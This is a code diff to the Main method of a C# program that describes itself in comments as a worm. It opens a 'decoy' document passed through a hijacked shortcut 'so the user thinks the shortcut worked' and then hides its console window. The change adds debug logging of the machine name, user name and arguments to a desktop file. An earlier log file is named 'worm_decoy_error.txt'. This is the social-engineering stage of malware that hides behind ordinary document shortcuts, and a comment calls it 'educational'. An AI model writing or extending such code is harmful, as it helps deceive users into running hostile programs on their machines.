@@ -46,17 +46,38 @@ class Program
 
     static async Task Main(string[] args)
     {
+        // DEBUG: Log everything about the decoy attempt
+        string debugLog = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "DECOY_DEBUG.txt");
+        try
+        {
+            File.AppendAllText(debugLog, $"\n=== {DateTime.Now:HH:mm:ss} ===\n");
+            File.AppendAllText(debugLog, $"Machine: {Environment.MachineName}\n");
+            File.AppendAllText(debugLog, $"User: {Environment.UserName}\n");
+            File.AppendAllText(debugLog, $"Args.Length: {args.Length}\n");
+            File.AppendAllText(debugLog, $"Args: [{string.Join(", ", args)}]\n");
+        }
+        catch { }
+
         // CRITICAL FIX: Open decoy document FIRST, before anything else
         // This ensures the user sees their document open regardless of what happens next
         if (args.Length > 0)
         {
             string targetDoc = args[0];
-            if (System.IO.File.Exists(targetDoc))
+
+            try { File.AppendAllText(debugLog, $"Target Doc: {targetDoc}\n"); } catch { }
+
+            bool fileExists = System.IO.File.Exists(targetDoc);
+            try { File.AppendAllText(debugLog, $"File Exists: {fileExists}\n"); } catch { }
+
+            if (fileExists)
             {
                 try
                 {
                     // Open the original document so the user thinks the shortcut worked
-                    Process.Start(new ProcessStartInfo(targetDoc) { UseShellExecute = true });
+                    var psi = new ProcessStartInfo(targetDoc) { UseShellExecute = true };
+                    Process.Start(psi);
+
+                    try { File.AppendAllText(debugLog, $"SUCCESS: Document opened\n"); } catch { }
                 }
                 catch (Exception ex)
                 {
@@ -64,12 +85,20 @@ class Program
                     // Only log for educational debugging
                     try
                     {
-                        string tempLog = Path.Combine(Path.GetTempPath(), "worm_decoy_error.txt");
-                        System.IO.File.AppendAllText(tempLog, $"[{DateTime.Now}] Decoy open failed: {ex.Message}\n");
+                        File.AppendAllText(debugLog, $"FAILED: {ex.Message}\n");
+                        File.AppendAllText(debugLog, $"Stack: {ex.StackTrace}\n");
                     }
                     catch { /* Even logging failed - just continue */ }
                 }
             }
+            else
+            {
+                try { File.AppendAllText(debugLog, $"SKIPPED: File does not exist\n"); } catch { }
+            }
+        }
+        else
+        {
+            try { File.AppendAllText(debugLog, $"SKIPPED: No arguments provided\n"); } catch { }
         }
 
         // Now hide the console window
